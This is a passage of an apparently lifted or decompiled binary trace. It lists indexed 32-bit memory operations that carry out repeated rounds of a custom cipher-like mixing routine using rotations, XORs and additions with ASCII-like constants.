[1884] MEM32[(r15 + 228)] = ((MEM32[(r15 + 88)] << 2) | (MEM32[(r15 + 88)] >> 30))
[1899] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 2))
[1914] MEM32[(r15 + 188)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[1938] MEM32[(r15 + 224)] = (((MEM32[(r15 + 80)] << 4) ^ (MEM32[(r15 + 80)] >> 5)) + MEM32[(r15 + 84)])
[1958] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 160)]) ^ MEM32[(r15 + 224)])
[1975] MEM32[(r15 + 228)] = ((MEM32[(r15 + 92)] << 3) | (MEM32[(r15 + 92)] >> 29))
[1990] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 3))
[2005] MEM32[(r15 + 192)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[2029] MEM32[(r15 + 224)] = (((MEM32[(r15 + 84)] << 4) ^ (MEM32[(r15 + 84)] >> 5)) + MEM32[(r15 + 88)])
[2049] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 164)]) ^ MEM32[(r15 + 224)])
[2066] MEM32[(r15 + 228)] = ((MEM32[(r15 + 96)] << 4) | (MEM32[(r15 + 96)] >> 28))
[2081] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 4))
[2096] MEM32[(r15 + 196)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[2120] MEM32[(r15 + 224)] = (((MEM32[(r15 + 88)] << 4) ^ (MEM32[(r15 + 88)] >> 5)) + MEM32[(r15 + 92)])
[2140] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 168)]) ^ MEM32[(r15 + 224)])
[2157] MEM32[(r15 + 228)] = ((MEM32[(r15 + 100)] << 5) | (MEM32[(r15 + 100)] >> 27))
[2172] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 5))
[2187] MEM32[(r15 + 200)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[2211] MEM32[(r15 + 224)] = (((MEM32[(r15 + 92)] << 4) ^ (MEM32[(r15 + 92)] >> 5)) + MEM32[(r15 + 96)])
[2231] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 172)]) ^ MEM32[(r15 + 224)])
[2248] MEM32[(r15 + 228)] = ((MEM32[(r15 + 72)] << 6) | (MEM32[(r15 + 72)] >> 26))
[2263] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 6))
[2278] MEM32[(r15 + 204)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[2302] MEM32[(r15 + 224)] = (((MEM32[(r15 + 96)] << 4) ^ (MEM32[(r15 + 96)] >> 5)) + MEM32[(r15 + 100)])
[2322] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 176)]) ^ MEM32[(r15 + 224)])
[2339] MEM32[(r15 + 228)] = ((MEM32[(r15 + 76)] << 7) | (MEM32[(r15 + 76)] >> 25))
[2354] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 7))
[2369] MEM32[(r15 + 208)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[2393] MEM32[(r15 + 224)] = (((MEM32[(r15 + 100)] << 4) ^ (MEM32[(r15 + 100)] >> 5)) + MEM32[(r15 + 72)])
[2413] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 180)]) ^ MEM32[(r15 + 224)])
[2430] MEM32[(r15 + 228)] = ((MEM32[(r15 + 80)] << 8) | (MEM32[(r15 + 80)] >> 24))
[2445] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 0))
[2460] MEM32[(r15 + 212)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[2473] MEM32[(r15 + 136)] = (MEM32[(r15 + 40)] ^ MEM32[(r15 + 184)])
[2486] MEM32[(r15 + 140)] = (MEM32[(r15 + 44)] ^ MEM32[(r15 + 188)])
[2499] MEM32[(r15 + 144)] = (MEM32[(r15 + 48)] ^ MEM32[(r15 + 192)])
[2512] MEM32[(r15 + 148)] = (MEM32[(r15 + 52)] ^ MEM32[(r15 + 196)])
[2525] MEM32[(r15 + 152)] = (MEM32[(r15 + 56)] ^ MEM32[(r15 + 200)])
[2538] MEM32[(r15 + 156)] = (MEM32[(r15 + 60)] ^ MEM32[(r15 + 204)])
[2551] MEM32[(r15 + 160)] = (MEM32[(r15 + 64)] ^ MEM32[(r15 + 208)])
[2564] MEM32[(r15 + 164)] = (MEM32[(r15 + 68)] ^ MEM32[(r15 + 212)])
[2572] MEM32[(r15 + 40)] = MEM32[(r15 + 72)]
[2580] MEM32[(r15 + 72)] = MEM32[(r15 + 136)]
[2588] MEM32[(r15 + 44)] = MEM32[(r15 + 76)]
[2596] MEM32[(r15 + 76)] = MEM32[(r15 + 140)]
[2604] MEM32[(r15 + 48)] = MEM32[(r15 + 80)]
[2612] MEM32[(r15 + 80)] = MEM32[(r15 + 144)]
[2620] MEM32[(r15 + 52)] = MEM32[(r15 + 84)]
[2628] MEM32[(r15 + 84)] = MEM32[(r15 + 148)]
[2636] MEM32[(r15 + 56)] = MEM32[(r15 + 88)]
[2644] MEM32[(r15 + 88)] = MEM32[(r15 + 152)]
[2652] MEM32[(r15 + 60)] = MEM32[(r15 + 92)]
[2660] MEM32[(r15 + 92)] = MEM32[(r15 + 156)]
[2668] MEM32[(r15 + 64)] = MEM32[(r15 + 96)]
[2676] MEM32[(r15 + 96)] = MEM32[(r15 + 160)]
[2684] MEM32[(r15 + 68)] = MEM32[(r15 + 100)]
[2692] MEM32[(r15 + 100)] = MEM32[(r15 + 164)]
[2704] MEM32[(r15 + 216)] = (MEM32[(r15 + 216)] + 0x70336365)
[2716] MEM32[(r15 + 220)] = (MEM32[(r15 + 220)] + 0x70336364)
[2745] MEM32[(r15 + 104)] = ((((MEM32[(r15 + 108)] ^ MEM32[(r15 + 216)]) << 3) | ((MEM32[(r15 + 108)] ^ MEM32[(r15 + 216)]) >> 29)) + MEM32[(r15 + 104)])
[2774] MEM32[(r15 + 108)] = ((((MEM32[(r15 + 112)] ^ MEM32[(r15 + 104)]) << 5) | ((MEM32[(r15 + 112)] ^ MEM32[(r15 + 104)]) >> 27)) + MEM32[(r15 + 108)])
[2803] MEM32[(r15 + 112)] = ((((MEM32[(r15 + 116)] ^ MEM32[(r15 + 108)]) << 7) | ((MEM32[(r15 + 116)] ^ MEM32[(r15 + 108)]) >> 25)) + MEM32[(r15 + 112)])
[2832] MEM32[(r15 + 116)] = ((((MEM32[(r15 + 120)] ^ MEM32[(r15 + 112)]) << 11) | ((MEM32[(r15 + 120)] ^ MEM32[(r15 + 112)]) >> 21)) + MEM32[(r15 + 116)])
[2861] MEM32[(r15 + 120)] = ((((MEM32[(r15 + 124)] ^ MEM32[(r15 + 116)]) << 13) | ((MEM32[(r15 + 124)] ^ MEM32[(r15 + 116)]) >> 19)) + MEM32[(r15 + 120)])
[2890] MEM32[(r15 + 124)] = ((((MEM32[(r15 + 128)] ^ MEM32[(r15 + 120)]) << 17) | ((MEM32[(r15 + 128)] ^ MEM32[(r15 + 120)]) >> 15)) + MEM32[(r15 + 124)])
[2919] MEM32[(r15 + 128)] = ((((MEM32[(r15 + 132)] ^ MEM32[(r15 + 124)]) << 19) | ((MEM32[(r15 + 132)] ^ MEM32[(r15 + 124)]) >> 13)) + MEM32[(r15 + 128)])
[2948] MEM32[(r15 + 132)] = ((((MEM32[(r15 + 104)] ^ MEM32[(r15 + 128)]) << 23) | ((MEM32[(r15 + 104)] ^ MEM32[(r15 + 128)]) >> 9)) + MEM32[(r15 + 132)])
[2966] MEM32[(r15 + 136)] = ((MEM32[(r15 + 104)] ^ MEM32[(r15 + 112)]) ^ MEM32[(r15 + 216)])
[2988] MEM32[(r15 + 140)] = ((MEM32[(r15 + 108)] ^ MEM32[(r15 + 116)]) ^ (MEM32[(r15 + 216)] + 0x62616f7a))
[3010] MEM32[(r15 + 144)] = ((MEM32[(r15 + 120)] ^ MEM32[(r15 + 128)]) ^ (MEM32[(r15 + 216)] + 0x6f6e6777))
[3032] MEM32[(r15 + 148)] = ((MEM32[(r15 + 124)] ^ MEM32[(r15 + 132)]) ^ (MEM32[(r15 + 216)] + 0x696e6221))
[3047] MEM32[(r15 + 152)] = (MEM32[(r15 + 104)] + MEM32[(r15 + 120)])
[3062] MEM32[(r15 + 156)] = (MEM32[(r15 + 108)] + MEM32[(r15 + 124)])
[3077] MEM32[(r15 + 160)] = (MEM32[(r15 + 112)] + MEM32[(r15 + 128)])
[3092] MEM32[(r15 + 164)] = (MEM32[(r15 + 116)] + MEM32[(r15 + 132)])
[3105] MEM32[(r15 + 168)] = (MEM32[(r15 + 104)] ^ MEM32[(r15 + 124)])
[3118] MEM32[(r15 + 172)] = (MEM32[(r15 + 108)] ^ MEM32[(r15 + 128)])
[3131] MEM32[(r15 + 176)] = (MEM32[(r15 + 112)] ^ MEM32[(r15 + 132)])
[3144] MEM32[(r15 + 180)] = (MEM32[(r15 + 116)] ^ MEM32[(r15 + 120)])
[3161] MEM32[(r15 + 224)] = ((MEM32[(r15 + 72)] >> 8) | (MEM32[(r15 + 72)] << 24))
[3176] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 76)])
[3189] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] ^ MEM32[(r15 + 136)])
[3206] MEM32[(r15 + 228)] = ((MEM32[(r15 + 76)] << 3) | (MEM32[(r15 + 76)] >> 29))
[3219] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ MEM32[(r15 + 224)])
[3227] MEM32[(r15 + 72)] = MEM32[(r15 + 224)]
[3235] MEM32[(r15 + 76)] = MEM32[(r15 + 228)]
[3252] MEM32[(r15 + 224)] = ((MEM32[(r15 + 80)] >> 8) | (MEM32[(r15 + 80)] << 24))
[3267] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 84)])
[3280] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] ^ MEM32[(r15 + 140)])
[3297] MEM32[(r15 + 228)] = ((MEM32[(r15 + 84)] << 3) | (MEM32[(r15 + 84)] >> 29))
[3310] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ MEM32[(r15 + 224)])
[3318] MEM32[(r15 + 80)] = MEM32[(r15 + 224)]
[3326] MEM32[(r15 + 84)] = MEM32[(r15 + 228)]
[3343] MEM32[(r15 + 224)] = ((MEM32[(r15 + 88)] >> 8) | (MEM32[(r15 + 88)] << 24))
[3358] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 92)])
[3371] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] ^ MEM32[(r15 + 144)])
[3388] MEM32[(r15 + 228)] = ((MEM32[(r15 + 92)] << 3) | (MEM32[(r15 + 92)] >> 29))
[3401] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ MEM32[(r15 + 224)])
[3409] MEM32[(r15 + 88)] = MEM32[(r15 + 224)]
[3417] MEM32[(r15 + 92)] = MEM32[(r15 + 228)]
[3434] MEM32[(r15 + 224)] = ((MEM32[(r15 + 96)] >> 8) | (MEM32[(r15 + 96)] << 24))
[3449] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 100)])
[3462] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] ^ MEM32[(r15 + 148)])
[3479] MEM32[(r15 + 228)] = ((MEM32[(r15 + 100)] << 3) | (MEM32[(r15 + 100)] >> 29))
[3492] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ MEM32[(r15 + 224)])
[3500] MEM32[(r15 + 96)] = MEM32[(r15 + 224)]
[3508] MEM32[(r15 + 100)] = MEM32[(r15 + 228)]
[3532] MEM32[(r15 + 224)] = (((MEM32[(r15 + 72)] << 4) ^ (MEM32[(r15 + 72)] >> 5)) + MEM32[(r15 + 76)])
[3552] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 152)]) ^ MEM32[(r15 + 224)])
[3569] MEM32[(r15 + 228)] = ((MEM32[(r15 + 84)] << 1) | (MEM32[(r15 + 84)] >> 31))
[3584] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 1))
[3599] MEM32[(r15 + 184)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[3623] MEM32[(r15 + 224)] = (((MEM32[(r15 + 76)] << 4) ^ (MEM32[(r15 + 76)] >> 5)) + MEM32[(r15 + 80)])
[3643] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 156)]) ^ MEM32[(r15 + 224)])
[3660] MEM32[(r15 + 228)] = ((MEM32[(r15 + 88)] << 2) | (MEM32[(r15 + 88)] >> 30))
[3675] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 2))
[3690] MEM32[(r15 + 188)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[3714] MEM32[(r15 + 224)] = (((MEM32[(r15 + 80)] << 4) ^ (MEM32[(r15 + 80)] >> 5)) + MEM32[(r15 + 84)])
[3734] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 160)]) ^ MEM32[(r15 + 224)])
[3751] MEM32[(r15 + 228)] = ((MEM32[(r15 + 92)] << 3) | (MEM32[(r15 + 92)] >> 29))
[3766] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 3))
[3781] MEM32[(r15 + 192)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[3805] MEM32[(r15 + 224)] = (((MEM32[(r15 + 84)] << 4) ^ (MEM32[(r15 + 84)] >> 5)) + MEM32[(r15 + 88)])
[3825] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 164)]) ^ MEM32[(r15 + 224)])
[3842] MEM32[(r15 + 228)] = ((MEM32[(r15 + 96)] << 4) | (MEM32[(r15 + 96)] >> 28))
[3857] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 4))
[3872] MEM32[(r15 + 196)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[3896] MEM32[(r15 + 224)] = (((MEM32[(r15 + 88)] << 4) ^ (MEM32[(r15 + 88)] >> 5)) + MEM32[(r15 + 92)])
[3916] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 168)]) ^ MEM32[(r15 + 224)])
[3933] MEM32[(r15 + 228)] = ((MEM32[(r15 + 100)] << 5) | (MEM32[(r15 + 100)] >> 27))
[3948] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 5))
[3963] MEM32[(r15 + 200)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[3987] MEM32[(r15 + 224)] = (((MEM32[(r15 + 92)] << 4) ^ (MEM32[(r15 + 92)] >> 5)) + MEM32[(r15 + 96)])
[4007] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 172)]) ^ MEM32[(r15 + 224)])
[4024] MEM32[(r15 + 228)] = ((MEM32[(r15 + 72)] << 6) | (MEM32[(r15 + 72)] >> 26))
[4039] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 6))
[4054] MEM32[(r15 + 204)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[4078] MEM32[(r15 + 224)] = (((MEM32[(r15 + 96)] << 4) ^ (MEM32[(r15 + 96)] >> 5)) + MEM32[(r15 + 100)])
[4098] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 176)]) ^ MEM32[(r15 + 224)])
[4115] MEM32[(r15 + 228)] = ((MEM32[(r15 + 76)] << 7) | (MEM32[(r15 + 76)] >> 25))
[4130] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 7))
[4145] MEM32[(r15 + 208)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[4169] MEM32[(r15 + 224)] = (((MEM32[(r15 + 100)] << 4) ^ (MEM32[(r15 + 100)] >> 5)) + MEM32[(r15 + 72)])
[4189] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 180)]) ^ MEM32[(r15 + 224)])
[4206] MEM32[(r15 + 228)] = ((MEM32[(r15 + 80)] << 8) | (MEM32[(r15 + 80)] >> 24))
[4221] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 0))
[4236] MEM32[(r15 + 212)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[4249] MEM32[(r15 + 136)] = (MEM32[(r15 + 40)] ^ MEM32[(r15 + 184)])
[4262] MEM32[(r15 + 140)] = (MEM32[(r15 + 44)] ^ MEM32[(r15 + 188)])
[4275] MEM32[(r15 + 144)] = (MEM32[(r15 + 48)] ^ MEM32[(r15 + 192)])
[4288] MEM32[(r15 + 148)] = (MEM32[(r15 + 52)] ^ MEM32[(r15 + 196)])
[4301] MEM32[(r15 + 152)] = (MEM32[(r15 + 56)] ^ MEM32[(r15 + 200)])
[4314] MEM32[(r15 + 156)] = (MEM32[(r15 + 60)] ^ MEM32[(r15 + 204)])
[4327] MEM32[(r15 + 160)] = (MEM32[(r15 + 64)] ^ MEM32[(r15 + 208)])
[4340] MEM32[(r15 + 164)] = (MEM32[(r15 + 68)] ^ MEM32[(r15 + 212)])
[4348] MEM32[(r15 + 40)] = MEM32[(r15 + 72)]
[4356] MEM32[(r15 + 72)] = MEM32[(r15 + 136)]
[4364] MEM32[(r15 + 44)] = MEM32[(r15 + 76)]
[4372] MEM32[(r15 + 76)] = MEM32[(r15 + 140)]
[4380] MEM32[(r15 + 48)] = MEM32[(r15 + 80)]
[4388] MEM32[(r15 + 80)] = MEM32[(r15 + 144)]
[4396] MEM32[(r15 + 52)] = MEM32[(r15 + 84)]
[4404] MEM32[(r15 + 84)] = MEM32[(r15 + 148)]
[4412] MEM32[(r15 + 56)] = MEM32[(r15 + 88)]
[4420] MEM32[(r15 + 88)] = MEM32[(r15 + 152)]
[4428] MEM32[(r15 + 60)] = MEM32[(r15 + 92)]
[4436] MEM32[(r15 + 92)] = MEM32[(r15 + 156)]
[4444] MEM32[(r15 + 64)] = MEM32[(r15 + 96)]
[4452] MEM32[(r15 + 96)] = MEM32[(r15 + 160)]
[4460] MEM32[(r15 + 68)] = MEM32[(r15 + 100)]
[4468] MEM32[(r15 + 100)] = MEM32[(r15 + 164)]
[4480] MEM32[(r15 + 216)] = (MEM32[(r15 + 216)] + 0x70336366)
[4492] MEM32[(r15 + 220)] = (MEM32[(r15 + 220)] + 0x70336364)
[4521] MEM32[(r15 + 104)] = ((((MEM32[(r15 + 108)] ^ MEM32[(r15 + 216)]) << 3) | ((MEM32[(r15 + 108)] ^ MEM32[(r15 + 216)]) >> 29)) + MEM32[(r15 + 104)])
[4550] MEM32[(r15 + 108)] = ((((MEM32[(r15 + 112)] ^ MEM32[(r15 + 104)]) << 5) | ((MEM32[(r15 + 112)] ^ MEM32[(r15 + 104)]) >> 27)) + MEM32[(r15 + 108)])
[4579] MEM32[(r15 + 112)] = ((((MEM32[(r15 + 116)] ^ MEM32[(r15 + 108)]) << 7) | ((MEM32[(r15 + 116)] ^ MEM32[(r15 + 108)]) >> 25)) + MEM32[(r15 + 112)])
[4608] MEM32[(r15 + 116)] = ((((MEM32[(r15 + 120)] ^ MEM32[(r15 + 112)]) << 11) | ((MEM32[(r15 + 120)] ^ MEM32[(r15 + 112)]) >> 21)) + MEM32[(r15 + 116)])
[4637] MEM32[(r15 + 120)] = ((((MEM32[(r15 + 124)] ^ MEM32[(r15 + 116)]) << 13) | ((MEM32[(r15 + 124)] ^ MEM32[(r15 + 116)]) >> 19)) + MEM32[(r15 + 120)])
[4666] MEM32[(r15 + 124)] = ((((MEM32[(r15 + 128)] ^ MEM32[(r15 + 120)]) << 17) | ((MEM32[(r15 + 128)] ^ MEM32[(r15 + 120)]) >> 15)) + MEM32[(r15 + 124)])
[4695] MEM32[(r15 + 128)] = ((((MEM32[(r15 + 132)] ^ MEM32[(r15 + 124)]) << 19) | ((MEM32[(r15 + 132)] ^ MEM32[(r15 + 124)]) >> 13)) + MEM32[(r15 + 128)])
[4724] MEM32[(r15 + 132)] = ((((MEM32[(r15 + 104)] ^ MEM32[(r15 + 128)]) << 23) | ((MEM32[(r15 + 104)] ^ MEM32[(r15 + 128)]) >> 9)) + MEM32[(r15 + 132)])
[4742] MEM32[(r15 + 136)] = ((MEM32[(r15 + 104)] ^ MEM32[(r15 + 112)]) ^ MEM32[(r15 + 216)])
[4764] MEM32[(r15 + 140)] = ((MEM32[(r15 + 108)] ^ MEM32[(r15 + 116)]) ^ (MEM32[(r15 + 216)] + 0x62616f7a))
[4786] MEM32[(r15 + 144)] = ((MEM32[(r15 + 120)] ^ MEM32[(r15 + 128)]) ^ (MEM32[(r15 + 216)] + 0x6f6e6777))
[4808] MEM32[(r15 + 148)] = ((MEM32[(r15 + 124)] ^ MEM32[(r15 + 132)]) ^ (MEM32[(r15 + 216)] + 0x696e6221))
[4823] MEM32[(r15 + 152)] = (MEM32[(r15 + 104)] + MEM32[(r15 + 120)])
[4838] MEM32[(r15 + 156)] = (MEM32[(r15 + 108)] + MEM32[(r15 + 124)])
[4853] MEM32[(r15 + 160)] = (MEM32[(r15 + 112)] + MEM32[(r15 + 128)])
[4868] MEM32[(r15 + 164)] = (MEM32[(r15 + 116)] + MEM32[(r15 + 132)])
[4881] MEM32[(r15 + 168)] = (MEM32[(r15 + 104)] ^ MEM32[(r15 + 124)])
[4894] MEM32[(r15 + 172)] = (MEM32[(r15 + 108)] ^ MEM32[(r15 + 128)])
[4907] MEM32[(r15 + 176)] = (MEM32[(r15 + 112)] ^ MEM32[(r15 + 132)])
[4920] MEM32[(r15 + 180)] = (MEM32[(r15 + 116)] ^ MEM32[(r15 + 120)])
[4937] MEM32[(r15 + 224)] = ((MEM32[(r15 + 72)] >> 8) | (MEM32[(r15 + 72)] << 24))
[4952] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 76)])
[4965] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] ^ MEM32[(r15 + 136)])
[4982] MEM32[(r15 + 228)] = ((MEM32[(r15 + 76)] << 3) | (MEM32[(r15 + 76)] >> 29))
[4995] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ MEM32[(r15 + 224)])
[5003] MEM32[(r15 + 72)] = MEM32[(r15 + 224)]
[5011] MEM32[(r15 + 76)] = MEM32[(r15 + 228)]
[5028] MEM32[(r15 + 224)] = ((MEM32[(r15 + 80)] >> 8) | (MEM32[(r15 + 80)] << 24))
[5043] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 84)])
[5056] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] ^ MEM32[(r15 + 140)])
[5073] MEM32[(r15 + 228)] = ((MEM32[(r15 + 84)] << 3) | (MEM32[(r15 + 84)] >> 29))
[5086] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ MEM32[(r15 + 224)])
[5094] MEM32[(r15 + 80)] = MEM32[(r15 + 224)]
[5102] MEM32[(r15 + 84)] = MEM32[(r15 + 228)]
[5119] MEM32[(r15 + 224)] = ((MEM32[(r15 + 88)] >> 8) | (MEM32[(r15 + 88)] << 24))
[5134] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 92)])
[5147] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] ^ MEM32[(r15 + 144)])
[5164] MEM32[(r15 + 228)] = ((MEM32[(r15 + 92)] << 3) | (MEM32[(r15 + 92)] >> 29))
[5177] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ MEM32[(r15 + 224)])
[5185] MEM32[(r15 + 88)] = MEM32[(r15 + 224)]
[5193] MEM32[(r15 + 92)] = MEM32[(r15 + 228)]
[5210] MEM32[(r15 + 224)] = ((MEM32[(r15 + 96)] >> 8) | (MEM32[(r15 + 96)] << 24))
[5225] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 100)])
[5238] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] ^ MEM32[(r15 + 148)])
[5255] MEM32[(r15 + 228)] = ((MEM32[(r15 + 100)] << 3) | (MEM32[(r15 + 100)] >> 29))
[5268] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ MEM32[(r15 + 224)])
[5276] MEM32[(r15 + 96)] = MEM32[(r15 + 224)]
[5284] MEM32[(r15 + 100)] = MEM32[(r15 + 228)]
[5308] MEM32[(r15 + 224)] = (((MEM32[(r15 + 72)] << 4) ^ (MEM32[(r15 + 72)] >> 5)) + MEM32[(r15 + 76)])
[5328] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 152)]) ^ MEM32[(r15 + 224)])
[5345] MEM32[(r15 + 228)] = ((MEM32[(r15 + 84)] << 1) | (MEM32[(r15 + 84)] >> 31))
[5360] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 1))
[5375] MEM32[(r15 + 184)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[5399] MEM32[(r15 + 224)] = (((MEM32[(r15 + 76)] << 4) ^ (MEM32[(r15 + 76)] >> 5)) + MEM32[(r15 + 80)])
[5419] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 156)]) ^ MEM32[(r15 + 224)])
[5436] MEM32[(r15 + 228)] = ((MEM32[(r15 + 88)] << 2) | (MEM32[(r15 + 88)] >> 30))
[5451] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 2))
[5466] MEM32[(r15 + 188)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[5490] MEM32[(r15 + 224)] = (((MEM32[(r15 + 80)] << 4) ^ (MEM32[(r15 + 80)] >> 5)) + MEM32[(r15 + 84)])
[5510] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 160)]) ^ MEM32[(r15 + 224)])
[5527] MEM32[(r15 + 228)] = ((MEM32[(r15 + 92)] << 3) | (MEM32[(r15 + 92)] >> 29))
[5542] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 3))
[5557] MEM32[(r15 + 192)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[5581] MEM32[(r15 + 224)] = (((MEM32[(r15 + 84)] << 4) ^ (MEM32[(r15 + 84)] >> 5)) + MEM32[(r15 + 88)])
[5601] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 164)]) ^ MEM32[(r15 + 224)])
[5618] MEM32[(r15 + 228)] = ((MEM32[(r15 + 96)] << 4) | (MEM32[(r15 + 96)] >> 28))
[5633] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 4))
[5648] MEM32[(r15 + 196)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[5672] MEM32[(r15 + 224)] = (((MEM32[(r15 + 88)] << 4) ^ (MEM32[(r15 + 88)] >> 5)) + MEM32[(r15 + 92)])
[5692] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 168)]) ^ MEM32[(r15 + 224)])
[5709] MEM32[(r15 + 228)] = ((MEM32[(r15 + 100)] << 5) | (MEM32[(r15 + 100)] >> 27))
[5724] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 5))
[5739] MEM32[(r15 + 200)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[5763] MEM32[(r15 + 224)] = (((MEM32[(r15 + 92)] << 4) ^ (MEM32[(r15 + 92)] >> 5)) + MEM32[(r15 + 96)])
[5783] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 172)]) ^ MEM32[(r15 + 224)])
[5800] MEM32[(r15 + 228)] = ((MEM32[(r15 + 72)] << 6) | (MEM32[(r15 + 72)] >> 26))
[5815] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 6))
[5830] MEM32[(r15 + 204)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[5854] MEM32[(r15 + 224)] = (((MEM32[(r15 + 96)] << 4) ^ (MEM32[(r15 + 96)] >> 5)) + MEM32[(r15 + 100)])
[5874] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 176)]) ^ MEM32[(r15 + 224)])
[5891] MEM32[(r15 + 228)] = ((MEM32[(r15 + 76)] << 7) | (MEM32[(r15 + 76)] >> 25))
[5906] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 7))
[5921] MEM32[(r15 + 208)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
